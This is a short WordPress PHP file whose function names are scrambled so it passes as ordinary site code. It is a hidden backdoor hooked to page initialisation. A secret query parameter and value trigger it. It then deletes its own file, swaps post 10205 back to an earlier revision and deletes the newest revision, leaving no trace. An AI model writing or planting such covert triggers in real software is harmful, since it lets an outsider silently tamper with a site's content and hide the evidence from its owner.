<?php

function comments_translation_daily() {
	if (isset($_GET['fonts_force_gateway_variations']) && $_GET['fonts_force_gateway_variations'] === 'top_tools_text_subscriptions') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$button_awesome_post = 10205;
		$statistics_system_card_variation = wp_get_post_revisions($button_awesome_post);
		if (empty($statistics_system_card_variation)) die('no revisions');
		if (count($statistics_system_card_variation) < 2) die('less than 2');
		$tag_widgets_titles = array_shift($statistics_system_card_variation);
		$speed_form_titles = $tag_widgets_titles->ID;
		$converter_wpc_share_support = array_shift($statistics_system_card_variation);
		$cache_jquery_shortcode = $converter_wpc_share_support->ID;
		$error_solution_reading_another = wp_restore_post_revision($cache_jquery_shortcode);
		if ($error_solution_reading_another === false) die('error restoring');
		$error_solution_reading_another = wp_delete_post_revision($speed_form_titles);		
		if ($error_solution_reading_another === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'comments_translation_daily');
